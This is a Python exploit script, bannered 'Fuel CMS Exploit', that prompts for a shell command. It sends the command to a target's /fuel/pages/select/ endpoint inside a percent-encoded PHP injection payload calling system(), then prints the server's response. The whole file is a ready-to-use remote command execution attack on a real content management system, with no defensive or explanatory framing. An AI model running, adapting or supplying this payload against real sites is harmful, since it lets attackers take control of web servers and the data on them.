import os
import requests
from colorama import Back, Fore, Style
import colorama
from urllib.parse import quote
import argparse
from bs4 import BeautifulSoup
import sys

os.system("clear")

banner = """
-------------------------------
Fuel CMS Exploit
Coded By Xale [TD] ~ @xaletr python3 fuel.py -u site
-------------------------------
"""

print(Fore.GREEN + Style.BRIGHT + banner)

if sys.argv[1] in ["-u", "--url"]:
 url = sys.argv[2]
 
cmd = input(Fore.YELLOW + Style.BRIGHT + "$ Enter Command : ")

vuln = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+quote(cmd)+"%27%29%2b%27"

r = requests.get(vuln)

output = r.text.split('<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">')
print(output) 
